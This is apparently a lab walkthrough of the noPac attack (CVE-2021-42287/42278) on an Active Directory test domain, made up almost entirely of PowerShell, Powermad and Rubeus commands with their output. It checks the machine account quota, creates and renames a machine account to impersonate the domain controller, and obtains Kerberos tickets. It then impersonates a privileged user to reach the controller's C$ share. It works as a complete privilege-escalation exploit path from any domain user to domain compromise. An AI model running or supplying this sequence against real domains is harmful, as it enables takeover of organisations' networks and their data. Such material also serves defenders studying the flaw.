Thanks for : https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html

To exploit this requires 3 things, at least 1 DC not patched, any valid domain user account and a Machine Account Quota (MAQ) above 0

Check MAQ value in domain (default 10)

	. .\PowerView.ps1
	Get-DomainObject ("DC=child,DC=valhalla,DC=Local") | select ms-ds-machineaccountquota

	ms-ds-machineaccountquota
	-------------------------
							10

this will do also, if you are seing something more than 0 , it is okay

	(((Get-DomainObject -Domain (Get-NetDomain).Name)) | where { $_.'ms-ds-machineaccountquota' }).'ms-ds-machineaccountquota'


Check if domain users has rights

	PS C:\Users\testuser\Desktop> ((Get-DomainPolicy -Policy DC).PrivilegeRights | select SeMachineAccountPrivilege)

	SeMachineAccountPrivilege
	-------------------------
	*S-1-5-11

	PS C:\Users\testuser\Desktop> ConvertFrom-SID S-1-5-11
	Authenticated Users
							
							
To scan is dc vulnerable use this : https://github.com/cube0x0/noPac

if vulnerable, it will return a small size ticket

	 .\noPac.exe scan -domain child.valhalla.local -user testuser -pass 'Pass123!'
	[+] Got TGT from kabil.child.valhalla.local. Ticket size: 577
	
	
You can also use this : https://github.com/GhostPack/Rubeus

it will return small ticket

	.\Rubeus.exe asktgt /user:testuser /password:Pass123! /domain:child.valhalla.local /dc:kabil.child.valhalla.local /nowrap /nopac
	
# Exploitation

we will create a new machine account with  : https://github.com/Kevin-Robertson/Powermad

	. .\Powermad.ps1
	New-MachineAccount -MachineAccount TestMachine -Domain child.valhalla.local -DomainController kabil.child.valhalla.local
	Enter a password for the new machine account: ********
	[+] Machine account TestMachine added

You can check is with 

	. .\PowerView.ps1
	 Get-DomainComputer -Identity TestMachine
	 
	 pwdlastset             : 12/12/2021 6:17:32 PM
	logoncount             : 0
	badpasswordtime        : 1/1/1601 2:00:00 AM
	distinguishedname      : CN=TestMachine,CN=Computers,DC=child,DC=valhalla,DC=local
	objectclass            : {top, person, organizationalPerson, user...}
	name                   : TestMachine
	objectsid              : S-1-5-21-988250465-358338136-668553488-1110
	samaccountname         : TestMachine$
	localpolicyflags       : 0
	codepage               : 0
	samaccounttype         : MACHINE_ACCOUNT
	accountexpires         : NEVER
	countrycode            : 0
	whenchanged            : 12/12/2021 4:17:32 PM
	instancetype           : 4
	usncreated             : 13487
	objectguid             : 29a3178e-647f-4a8d-a9c4-f11809337963
	lastlogon              : 1/1/1601 2:00:00 AM
	lastlogoff             : 1/1/1601 2:00:00 AM
	objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=valhalla,DC=local
	dscorepropagationdata  : 1/1/1601 12:00:00 AM
	serviceprincipalname   : {RestrictedKrbHost/TestMachine, HOST/TestMachine, RestrictedKrbHost/TestMachine.child.valhalla.local,
							 HOST/TestMachine.child.valhalla.local}
	ms-ds-creatorsid       : {1, 5, 0, 0...}
	badpwdcount            : 0
	cn                     : TestMachine
	useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
	whencreated            : 12/12/2021 4:17:32 PM
	primarygroupid         : 515
	iscriticalsystemobject : False
	usnchanged             : 13489
	dnshostname            : TestMachine.child.valhalla.local
	

Clear SPN for machine account

	Set-DomainObject (Get-DomainComputer -Identity TestMachine).distinguishedname -Clear 'serviceprincipalname' -Verbose
	VERBOSE: [Get-DomainSearcher] search base: LDAP://KABIL.CHILD.VALHALLA.LOCAL/DC=CHILD,DC=VALHALLA,DC=LOCAL
	VERBOSE: [Get-DomainObject] Extracted domain 'child.valhalla.local' from 'CN=TestMachine,CN=Computers,DC=child,DC=valhalla,DC=local'
	VERBOSE: [Get-DomainSearcher] search base: LDAP://KABIL.CHILD.VALHALLA.LOCAL/DC=child,DC=valhalla,DC=local
	VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=TestMachine,CN=Computers,DC=child,DC=valhalla,DC=local)))
	VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'TestMachine$'
	
	
	Get-DomainComputer -Identity TestMachine
	
	pwdlastset             : 12/12/2021 6:17:32 PM
	logoncount             : 0
	badpasswordtime        : 1/1/1601 2:00:00 AM
	distinguishedname      : CN=TestMachine,CN=Computers,DC=child,DC=valhalla,DC=local
	objectclass            : {top, person, organizationalPerson, user...}
	name                   : TestMachine
	objectsid              : S-1-5-21-988250465-358338136-668553488-1110
	samaccountname         : TestMachine$
	localpolicyflags       : 0
	codepage               : 0
	samaccounttype         : MACHINE_ACCOUNT
	accountexpires         : NEVER
	countrycode            : 0
	whenchanged            : 12/12/2021 4:21:03 PM
	instancetype           : 4
	usncreated             : 13487
	objectguid             : 29a3178e-647f-4a8d-a9c4-f11809337963
	lastlogon              : 1/1/1601 2:00:00 AM
	lastlogoff             : 1/1/1601 2:00:00 AM
	objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=valhalla,DC=local
	dscorepropagationdata  : 1/1/1601 12:00:00 AM
	ms-ds-creatorsid       : {1, 5, 0, 0...}
	badpwdcount            : 0
	cn                     : TestMachine
	useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
	whencreated            : 12/12/2021 4:17:32 PM
	primarygroupid         : 515
	iscriticalsystemobject : False
	usnchanged             : 13491
	dnshostname            : TestMachine.child.valhalla.local
	
	
Sam account name of Domain controller

	(Get-DomainComputer -Identity ((Get-DomainController).Name)).samaccountname
	KABIL$
	
Set sam account name of TestMachine to DC sam account name without $

	Set-MachineAccountAttribute -MachineAccount TestMachine -Value 'KABIL' -Attribute samaccountname -Verbose
	VERBOSE: [+] Domain Controller = kabil.child.valhalla.local
	VERBOSE: [+] Domain = child.valhalla.local
	VERBOSE: [+] Distinguished Name = CN=TestMachine,CN=Computers,DC=child,DC=valhalla,DC=local
	[+] Machine account TestMachine attribute samaccountname updated
	
 	
Check changes for Machine 
	
	Get-DomainComputer -Identity TestMachine
	pwdlastset             : 12/12/2021 6:17:32 PM
	logoncount             : 0
	badpasswordtime        : 1/1/1601 2:00:00 AM
	distinguishedname      : CN=TestMachine,CN=Computers,DC=child,DC=valhalla,DC=local
	objectclass            : {top, person, organizationalPerson, user...}
	name                   : TestMachine
	objectsid              : S-1-5-21-988250465-358338136-668553488-1110
	samaccountname         : KABIL
	localpolicyflags       : 0
	codepage               : 0
	samaccounttype         : MACHINE_ACCOUNT
	accountexpires         : NEVER
	countrycode            : 0
	whenchanged            : 12/12/2021 4:25:24 PM
	instancetype           : 4
	usncreated             : 13487
	objectguid             : 29a3178e-647f-4a8d-a9c4-f11809337963
	lastlogon              : 1/1/1601 2:00:00 AM
	lastlogoff             : 1/1/1601 2:00:00 AM
	objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=valhalla,DC=local
	dscorepropagationdata  : 1/1/1601 12:00:00 AM
	ms-ds-creatorsid       : {1, 5, 0, 0...}
	badpwdcount            : 0
	cn                     : TestMachine
	useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
	whencreated            : 12/12/2021 4:17:32 PM
	primarygroupid         : 515
	iscriticalsystemobject : False
	usnchanged             : 13492
	dnshostname            : TestMachine.child.valhalla.local
	
	
Ask a new TGT

	.\Rubeus.exe asktgt /user:KABIL /password:Pass123! /domain:child.valhalla.local /dc:kabil.child.valhalla.local /nowrap

	[*] Action: Ask TGT

	[*] Using rc4_hmac hash: C718F548C75062ADA93250DB208D3178
	[*] Building AS-REQ (w/ preauth) for: 'child.valhalla.local\KABIL'
	[+] TGT request successful!
	[*] base64(ticket.kirbi):

		  doIFLDCCBSigAwIBBaEDAgEWo.......G9jYWw=

	  ServiceName              :  krbtgt/child.valhalla.local
	  ServiceRealm             :  CHILD.VALHALLA.LOCAL
	  UserName                 :  KABIL
	  UserRealm                :  CHILD.VALHALLA.LOCAL
	  StartTime                :  12/12/2021 6:27:00 PM
	  EndTime                  :  12/13/2021 4:27:00 AM
	  RenewTill                :  12/19/2021 6:27:00 PM
	  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
	  KeyType                  :  rc4_hmac
	  Base64(key)              :  kfbRBBGAwdaS1HA+21j2Jw==
	  ASREP (key)              :  C718F548C75062ADA93250DB208D3178
	  
	  
Revert machine account sam to old one

	Set-MachineAccountAttribute -MachineAccount TestMachine -Value 'TestMachine$' -Attribute samaccountname -Verbose
	VERBOSE: [+] Domain Controller = kabil.child.valhalla.local
	VERBOSE: [+] Domain = child.valhalla.local
	VERBOSE: [+] Distinguished Name = CN=TestMachine,CN=Computers,DC=child,DC=valhalla,DC=local
	
Ask a s4u ticket with rubeus

	.\Rubeus.exe s4u /self /impersonateuser:superuser /altservice:"cifs/kabil.child.valhalla.local" /dc:kabil.child.valhalla.local /ptt
	/ticket:doIFLDCCBSigAwIBBa...BsUY2hpbGQudmFsaGFsbGEubG9jYWw=

	[*] Action: S4U

	[*] Action: S4U

	[*] Using domain controller: kabil.child.valhalla.local (192.168.200.200)
	[*] Building S4U2self request for: 'KABIL@CHILD.VALHALLA.LOCAL'
	[*] Sending S4U2self request
	[+] S4U2self success!
	[*] Substituting alternative service name 'cifs/kabil.child.valhalla.local'
	[*] Got a TGS for 'superuser' to 'cifs@CHILD.VALHALLA.LOCAL'
	[*] base64(ticket.kirbi):

		  doIFvjCCBbqgAw......sb2NhbA==

	[+] Ticket successfully imported!
	
	PS C:\Users\testuser\Desktop> klist

	Current LogonId is 0:0x2b91e
	Cached Tickets: (1)

	#0>     Client: superuser @ CHILD.VALHALLA.LOCAL
			Server: cifs/kabil.child.valhalla.local @ CHILD.VALHALLA.LOCAL
			KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
			Ticket Flags 0xa50000 -> renewable pre_authent ok_as_delegate name_canonicalize
			Start Time: 12/12/2021 18:38:21 (local)
			End Time:   12/13/2021 4:33:30 (local)
			Renew Time: 12/19/2021 18:33:30 (local)
			Session Key Type: AES-256-CTS-HMAC-SHA1-96
			Cache Flags: 0
			Kdc Called:
	PS C:\Users\testuser\Desktop> dir \\kabil.child.valhalla.local\c$
	Directory: \\kabil.child.valhalla.local\c$


	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	d-----        8/22/2013   5:52 PM                PerfLogs
	d-r---       11/26/2021   9:40 AM                Program Files
	d-----       11/26/2021   9:40 AM                Program Files (x86)
	d-r---       11/26/2021   9:24 AM                Users
	d-----       11/26/2021   9:10 AM                Windows
